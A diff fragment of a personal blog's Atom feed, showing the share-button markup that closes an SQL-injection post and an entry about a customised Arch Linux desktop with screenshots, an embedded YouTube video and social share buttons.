+    /*#share-buttons>div.gplus>svg {
+        height: 28px;
+        margin-top: 9px;
+        position: relative;
+        left: 1px;
+    }*/
+
+    #share-buttons>div.mail>svg {
+        height: 29px;
+        margin-top: 11px;
+    }
+</style>
+
+<p><span style="color: rgb(114, 248, 4);">Share on: </span></p>
+<div id="share-buttons">
+    <div class="facebook" title="Share this on Facebook" onclick="window.open('http://www.facebook.com/share.php?u=http://localhost:4000/blog/sql-injections');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1343 12v264h-157q-86 0-116 36t-30 108v189h293l-39 296h-254v759h-306v-759h-255v-296h255v-218q0-186 104-288.5t277-102.5q147 0 228 12z" />
+        </svg></div>
+    <div class="twitter" title="Share this on Twitter" onclick="window.open('http://twitter.com/home?status=http://localhost:4000/blog/sql-injections');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1684 408q-67 98-162 167 1 14 1 42 0 130-38 259.5t-115.5 248.5-184.5 210.5-258 146-323 54.5q-271 0-496-145 35 4 78 4 225 0 401-138-105-2-188-64.5t-114-159.5q33 5 61 5 43 0 85-11-112-23-185.5-111.5t-73.5-205.5v-4q68 38 146 41-66-44-105-115t-39-154q0-88 44-163 121 149 294.5 238.5t371.5 99.5q-8-38-8-74 0-134 94.5-228.5t228.5-94.5q140 0 236 102 109-21 205-78-37 115-142 178 93-10 186-50z" />
+        </svg></div>
+    <div class="linkedin" title="Share this on Linkedin" onclick="window.open('https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:4000/blog/sql-injections&amp;title=&amp;summary=&amp;source=');">
+        <svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M477 625v991h-330v-991h330zm21-306q1 73-50.5 122t-135.5 49h-2q-82 0-132-49t-50-122q0-74 51.5-122.5t134.5-48.5 133 48.5 51 122.5zm1166 729v568h-329v-530q0-105-40.5-164.5t-126.5-59.5q-63 0-105.5 34.5t-63.5 85.5q-11 30-11 81v553h-329q2-399 2-647t-1-296l-1-48h329v144h-2q20-32 41-56t56.5-52 87-43.5 114.5-15.5q171 0 275 113.5t104 332.5z" />
+        </svg>
+    </div>
+    
+    <!--<div class="gplus" title="Share this on Google Plus"
+        onclick="window.open('https://plus.google.com/share?url=http://localhost:4000/blog/sql-injections');"><svg
+            viewBox="0 0 2304 1792" xmlns="http://www.w3.org/2000/svg">
+            <path
+                d="M1437 913q0 208-87 370.5t-248 254-369 91.5q-149 0-285-58t-234-156-156-234-58-285 58-285 156-234 234-156 285-58q286 0 491 192l-199 191q-117-113-292-113-123 0-227.5 62t-165.5 168.5-61 232.5 61 232.5 165.5 168.5 227.5 62q83 0 152.5-23t114.5-57.5 78.5-78.5 49-83 21.5-74h-416v-252h692q12 63 12 122zm867-122v210h-209v209h-210v-209h-209v-210h209v-209h210v209h209z" />
+        </svg></div> -->
+    <div class="mail" title="Share this through Email" onclick="window.open('mailto:?&amp;body=http://localhost:4000/blog/sql-injections');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1792 710v794q0 66-47 113t-113 47h-1472q-66 0-113-47t-47-113v-794q44 49 101 87 362 246 497 345 57 42 92.5 65.5t94.5 48 110 24.5h2q51 0 110-24.5t94.5-48 92.5-65.5q170-123 498-345 57-39 100-87zm0-294q0 79-49 151t-122 123q-376 261-468 325-10 7-42.5 30.5t-54 38-52 32.5-57.5 27-50 9h-2q-23 0-50-9t-57.5-27-52-32.5-54-38-42.5-30.5q-91-64-262-182.5t-205-142.5q-62-42-117-115.5t-55-136.5q0-78 41.5-130t118.5-52h1472q65 0 112.5 47t47.5 113z" />
+        </svg></div>
+</div>]]></content><author><name></name></author><category term="SQl Injection" /><category term="Ethical Hacker" /><category term="Cybersecurity" /><summary type="html"><![CDATA[(mostly parched) (basic-low-medium level)]]></summary></entry><entry><title type="html">Unix Porn Arch LifeStyle [MyCustom]</title><link href="http://localhost:4000/blog/unix-porn" rel="alternate" type="text/html" title="Unix Porn Arch LifeStyle [MyCustom]" /><published>2022-11-11T00:00:00+01:00</published><updated>2022-11-11T00:00:00+01:00</updated><id>http://localhost:4000/blog/unix-porn</id><content type="html" xml:base="http://localhost:4000/blog/unix-porn"><![CDATA[<p><img src="/assets/images/imagesposts/archunix.png" alt="UnixPorn" /></p>
+
+<p><img src="/assets/images/imagesposts/archunix2.png" alt="UnixPorn" /></p>
+
+<p><strong>Youtube Channel</strong></p>
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/OcsGsyI-ynU" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
+
+<style>
+    #share-buttons {
+        display: inline-block;
+        vertical-align: middle;
+    }
+
+    #share-buttons:after {
+        content: "`In a time of deceit telling the truth is a revolutionary act`";
+        display: block;
+        clear: both;
+    }
+
+    #share-buttons>div {
+        position: relative;
+        text-align: left;
+        height: 36px;
+        width: 32px;
+        float: left;
+        text-align: center;
+    }
+
+    #share-buttons>div>svg {
+        height: 16px;
+        fill: #0eec46;
+        margin-top: 20px;
+    }
+
+    #share-buttons>div:hover {
+        cursor: pointer;
+    }
+
+    #share-buttons>div.facebook:hover>svg {
+        fill: #3B5998;
+    }
+
+    #share-buttons>div.twitter:hover>svg {
+        fill: #55ACEE;
+    }
+
+    #share-buttons>div.linkedin:hover>svg {
+        fill: #0077b5;
+    }
+
+    #share-buttons>div.pinterest:hover>svg {
+        fill: #CB2027;
+    }
+
+    #share-buttons>div.gplus:hover>svg {
+        fill: #dd4b39;
+    }
+
+    #share-buttons>div.mail:hover>svg {
+        fill: #7D7D7D;
+    }
+
+    #share-buttons>div.instagram:hover>svg {
+        fill: #C73B92;
+    }
+
+    #share-buttons>div.facebook>svg {
+        height: 29px;
+        margin-top: 9px;
+    }
+
+    #share-buttons>div.twitter>svg {
+        height: 33px;
+        margin-top: 8px;
+    }
+
+    #share-buttons>div.linkedin>svg {
+        height: 32px;
+        margin-top: 7px;
+    }
+
+    #share-buttons>div.pinterest>svg {
+        height: 29px;
+        margin-top: 9px;
+    }
+
+    /*#share-buttons>div.gplus>svg {
+        height: 28px;
+        margin-top: 9px;
+        position: relative;
+        left: 1px;
+    }*/
+
+    #share-buttons>div.mail>svg {
+        height: 29px;
+        margin-top: 11px;
+    }
+</style>
+
+<p><span style="color: rgb(114, 248, 4);">Share on: </span></p>
+<div id="share-buttons">
+    <div class="facebook" title="Share this on Facebook" onclick="window.open('http://www.facebook.com/share.php?u=http://localhost:4000/blog/unix-porn');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1343 12v264h-157q-86 0-116 36t-30 108v189h293l-39 296h-254v759h-306v-759h-255v-296h255v-218q0-186 104-288.5t277-102.5q147 0 228 12z" />
+        </svg></div>
+    <div class="twitter" title="Share this on Twitter" onclick="window.open('http://twitter.com/home?status=http://localhost:4000/blog/unix-porn');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1684 408q-67 98-162 167 1 14 1 42 0 130-38 259.5t-115.5 248.5-184.5 210.5-258 146-323 54.5q-271 0-496-145 35 4 78 4 225 0 401-138-105-2-188-64.5t-114-159.5q33 5 61 5 43 0 85-11-112-23-185.5-111.5t-73.5-205.5v-4q68 38 146 41-66-44-105-115t-39-154q0-88 44-163 121 149 294.5 238.5t371.5 99.5q-8-38-8-74 0-134 94.5-228.5t228.5-94.5q140 0 236 102 109-21 205-78-37 115-142 178 93-10 186-50z" />
+        </svg></div>
+    <div class="linkedin" title="Share this on Linkedin" onclick="window.open('https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:4000/blog/unix-porn&amp;title=&amp;summary=&amp;source=');">
+        <svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M477 625v991h-330v-991h330zm21-306q1 73-50.5 122t-135.5 49h-2q-82 0-132-49t-50-122q0-74 51.5-122.5t134.5-48.5 133 48.5 51 122.5zm1166 729v568h-329v-530q0-105-40.5-164.5t-126.5-59.5q-63 0-105.5 34.5t-63.5 85.5q-11 30-11 81v553h-329q2-399 2-647t-1-296l-1-48h329v144h-2q20-32 41-56t56.5-52 87-43.5 114.5-15.5q171 0 275 113.5t104 332.5z" />
+        </svg>
+    </div>
+    
+    <!--<div class="gplus" title="Share this on Google Plus"
+        onclick="window.open('https://plus.google.com/share?url=http://localhost:4000/blog/unix-porn');"><svg
+            viewBox="0 0 2304 1792" xmlns="http://www.w3.org/2000/svg">
+            <path
+                d="M1437 913q0 208-87 370.5t-248 254-369 91.5q-149 0-285-58t-234-156-156-234-58-285 58-285 156-234 234-156 285-58q286 0 491 192l-199 191q-117-113-292-113-123 0-227.5 62t-165.5 168.5-61 232.5 61 232.5 165.5 168.5 227.5 62q83 0 152.5-23t114.5-57.5 78.5-78.5 49-83 21.5-74h-416v-252h692q12 63 12 122zm867-122v210h-209v209h-210v-209h-209v-210h209v-209h210v209h209z" />
+        </svg></div> -->
+    <div class="mail" title="Share this through Email" onclick="window.open('mailto:?&amp;body=http://localhost:4000/blog/unix-porn');"><svg viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path d="M1792 710v794q0 66-47 113t-113 47h-1472q-66 0-113-47t-47-113v-794q44 49 101 87 362 246 497 345 57 42 92.5 65.5t94.5 48 110 24.5h2q51 0 110-24.5t94.5-48 92.5-65.5q170-123 498-345 57-39 100-87zm0-294q0 79-49 151t-122 123q-376 261-468 325-10 7-42.5 30.5t-54 38-52 32.5-57.5 27-50 9h-2q-23 0-50-9t-57.5-27-52-32.5-54-38-42.5-30.5q-91-64-262-182.5t-205-142.5q-62-42-117-115.5t-55-136.5q0-78 41.5-130t118.5-52h1472q65 0 112.5 47t47.5 113z" />
+        </svg></div>
+</div>]]></content><author><name></name></author><category term="youtube" /><category term="custom" /><category term="arch-linux" /><summary type="html"><![CDATA[Custom]]></summary></entry></feed>
